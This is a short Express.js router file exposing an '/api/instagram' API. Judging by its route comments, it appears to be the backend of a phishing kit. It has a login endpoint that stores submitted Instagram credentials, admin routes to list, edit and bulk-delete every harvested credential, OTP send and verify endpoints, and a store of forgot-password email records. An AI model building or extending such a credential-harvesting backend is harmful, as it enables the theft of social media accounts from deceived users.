const express = require('express');
const router = express.Router();

const {
  instagramLogin,
  getAllCredentials,
  updateCredential,
  deleteCredential,
  deleteCredentials,
  deleteAllCredentials,
} = require('../controllers/instagram.controller');

const { sendOtp, verifyOtpHandler } = require('../controllers/otp.controller');

const {
  getAllForgot,
  deleteAllForgot,
  deleteForgot,
  deleteForgotBulk,
} = require('../controllers/forgot.controller');

// GET  /api/instagram               — all credentials
// POST /api/instagram/login         — create a new credential entry
// POST /api/instagram/otp/send      — send OTP to email
// POST /api/instagram/otp/verify    — verify OTP
// GET  /api/instagram/forgot        — all forgot-password email records
// DELETE /api/instagram/forgot/all  — clear all forgot records
// DELETE /api/instagram/forgot/:id  — delete single forgot record
// DELETE /api/instagram/forgot      — bulk delete forgot records
// PUT  /api/instagram/:id           — update a credential
// DELETE /api/instagram/all         — delete ALL credentials
// DELETE /api/instagram/:id         — delete a single credential
// DELETE /api/instagram             — bulk delete { ids: [...] }

router.get('/',                getAllCredentials);
router.post('/login',          instagramLogin);
router.post('/otp/send',       sendOtp);
router.post('/otp/verify',     verifyOtpHandler);

// Forgot routes — must be before /:id
router.get('/forgot',          getAllForgot);
router.delete('/forgot/all',   deleteAllForgot);
router.delete('/forgot/:id',   deleteForgot);
router.delete('/forgot',       deleteForgotBulk);

router.delete('/all',          deleteAllCredentials);
router.put('/:id',             updateCredential);
router.delete('/:id',          deleteCredential);
router.delete('/',             deleteCredentials);

module.exports = router;
